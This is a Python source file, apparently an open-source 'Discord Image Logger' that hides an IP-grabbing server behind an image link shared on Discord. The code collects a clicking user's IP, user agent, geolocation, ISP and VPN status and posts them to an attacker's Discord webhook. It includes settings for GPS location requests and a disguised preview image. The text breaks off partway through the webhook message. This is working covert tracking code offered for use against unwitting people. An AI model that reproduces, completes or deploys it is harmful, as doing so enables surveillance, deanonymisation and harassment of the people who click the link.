# Discord Image Logger - Working Version
# By Tim$erz | https://github.com/timzz71

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json

__app__ = "Discord Image Logger"
__description__ = "Logs IP addresses and device info when users click Open Original on Discord"
__version__ = "v2.0"
__author__ = "Tim$erz"

config = {
    # ⚠️ PASTE YOUR WEBHOOK URL HERE ⚠️
    "webhook": "",
    
    # Customize the image shown when someone opens the link
    "image": "",
    
    # Webhook settings
    "username": "Image Logger",
    "color": 0x00FFFF,
    
    # Features
    "buggedImage": True,  # Shows loading image in Discord preview
    "accurateLocation": False,  # Set to True for GPS location (asks permission)
    "vpnCheck": 0,  # 0=log all, 1=no ping on VPN, 2=no alert on VPN
    "antiBot": 0,  # 0=log all, 1-4=ignore bots
    "linkAlerts": True,  # Alert when link is sent
}

blacklistedIPs = ("27", "104", "143", "164")

def get_ip_info(ip):
    """Get real IP information from ip-api.com"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,as,lat,lon,timezone,mobile,proxy,hosting")
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return None

def send_to_webhook(ip, useragent, info, endpoint="/imagelogger"):
    """Send all data to Discord webhook"""
    if not config["webhook"]:
        print("[!] No webhook URL set!")
        return
    
    # Parse user agent
    os_name = "Unknown"
    browser_name = "Unknown"
    try:
        if useragent:
            os_name, browser_name = httpagentparser.simple_detect(useragent)
    except:
        pass
    
    # Build the embed
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "📡 Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**🌐 IP Information:**
> **IP:** `{ip}`
> **ISP:** `{info.get('isp', 'Unknown') if info else 'Unknown'}`
> **ASN:** `{info.get('as', 'Unknown') if info else 'Unknown'}`
> **Country:** `{info.get('country', 'Unknown') if info else 'Unknown'}`
> **Region:** `{info.get('regionName', 'Unknown') if info else 'Unknown'}`
> **City:** `{info.get('city', 'Unknown') if info else 'Unknown'}`
> **Coordinates:** `{info.get('lat', 'N/A') if info else 'N/A'}, {info.get('lon', 'N/A') if info else 'N/A'}`
> **Timezone:** `{info.get('timezone', 'Unknown') if info else 'Unknown'}`
> **Mobile:** `{info.get('mobile', 'Unknown') if info else 'Unknown'}`
> **VPN/Proxy:** `{info.get('proxy', 'Unknown') if info else 'Unknown'}`
> **Hosting/Bot:** `{info.get('hosting', 'Unknown') if info else 'Unknown'}`

**💻 Device Information:**
> **OS:** `{os_name}`
> **Browser:** `{browser_name}`

**📄 User Agent:**
